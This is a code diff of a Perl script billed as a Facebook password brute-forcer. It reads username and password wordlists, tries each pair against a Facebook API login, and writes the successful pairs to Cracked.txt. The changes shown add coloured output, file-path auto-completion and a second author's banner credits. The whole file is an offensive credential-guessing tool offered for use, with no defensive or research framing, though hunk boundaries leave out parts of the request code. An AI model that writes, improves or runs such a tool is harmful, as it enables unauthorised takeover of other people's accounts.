@@ -1,39 +1,59 @@
+#!/usr/bin/perl
+#
+# Author: 1337r00t
+# Improver: Ghostboy-287
+# 
+#
+# Description:
+# [Cracker Password] - Brute Force Facebook in messenger ,inc
+#
+# Usage:
+# perl facebook.pl
+#
+# Tested on: Linux & Pentestbox
+#
+# Module Requirements: 
+#
+# cpan Term::Completion::Path
+# cpan Term::ANSIColor
+# ppm install LWP::UserAgent
+#
 ##########################################
-use LWP::UserAgent; # ppm install LWP::UserAgent
+use LWP::UserAgent; #Privacy
+use Term::ANSIColor qw(:constants); #Color 
+use Term::Completion::Path; #Auto-complete
 ##########################################
 system('cls');
-print qq(
-################################
-#  [Facebook API] BF FB API    #
-################################
-#     Coded By 1337r00t        #
-################################
-#                              #
-#   Instagram : 1337r00t       #
-#                              #
-#    Twitter : _1337r00t       #
-#                              #
-################################
-Enter [CTRL+C] For Exit :0\n);
-print qq(
-Enter Usernames File :
-> );
-$usernames=<STDIN>;
-chomp($usernames);
-open (USERFILE, "<$usernames") || die "[-] Can't Found ($usernames) !";
+print BOLD GREEN "
+   ##########################################################
+   #                ",BLUE BOLD,"[Facebook API] BF FB API",BOLD GREEN,"                #
+   ##########################################################
+   #      ",YELLOW,"Coded By 1337r00t & improved by Ghostboy-287",BOLD GREEN,"      #
+   ##########################################################
+   #                                                        #
+   #     ",RESET BOLD,"Instagram : 1337r00t  -/-  Twitter : _1337r00t",BOLD GREEN,"     #
+   #                                                        #
+   #     ",RESET BOLD,"Github : Ghostboy-287 -/- Twitter : Ghostboy287",BOLD GREEN,"    #
+   #                                                        #
+   ##########################################################
+                   ",RED,"Enter [CTRL+C] For Exit :0\n\n)",RESET;
+my $tc = Term::Completion::Path->new(
+prompt  =>BOLD BLUE " Enter Usernames File : ",RESET
+);
+my $usernames = $tc->complete();
+open (USERFILE, '<',$usernames) || die RED,"[-] Can't Found ($usernames) !",RESET;
 @USERS = <USERFILE>;
 close USERFILE;
 
-print qq(
-Enter Passwords File :
-> );
-$passwords=<STDIN>;
-chomp($passwords);
-open (PASSFILE, "<$passwords") || die "[-] Can't Found ($passwords) !";
+my $tc = Term::Completion::Path->new(
+prompt  =>BOLD BLUE " Enter Passwords File : ",RESET
+);
+my $passwords = $tc->complete();
+open (PASSFILE, '<',$passwords) || die RED,"[-] Can't Found ($passwords) !",RESET;
 @PASSS = <PASSFILE>;
 close PASSFILE;
 system('cls');
-print "Username List: ($usernames)\nPasswords: ($passwords)\n--------\nCracking Now !..\n";
+print "\n--------\n",YELLOW," Cracking Now !..\n",RESET;
 ######################
 foreach $username (@USERS) {
 chomp $username;
@@ -51,10 +71,10 @@ chomp $username;
 			}
 			);
 		if ($response->content=~ /"session_key"/) {
-			print "\t			----------------------------------
+			print BOLD GREEN"\t			----------------------------------
 			| Cracked :($username:$password) |\n
 			----------------------------------\n
-			";
+			",RESET;
 			open(R0T,">>Cracked.txt");
 			print R0T "($username:$password)\n";
 			close(R0T);
@@ -63,17 +83,17 @@ chomp $username;
 		else {
 			#Invalid username or password (401)
 			if ($response->content=~ /Invalid username or password/) {
-				print "Failed :($username:$password)\n";
+				print ITALIC MAGENTA" Failed :",RESET,"($username:$password)\n";
 			}
 			else
 			{
 				#Invalid username or email address (400)
 				if ($response->content=~ /Invalid username or email address/) {
-					print "NotFound :($username)\n";
+					print ITALIC MAGENTA" NotFound :",RESET,"($username)\n";
 				}
 				else
 				{
-					print "Error\n";
+					print ITALIC RED" Error\n",RESET;
 				}
 			}
 		}
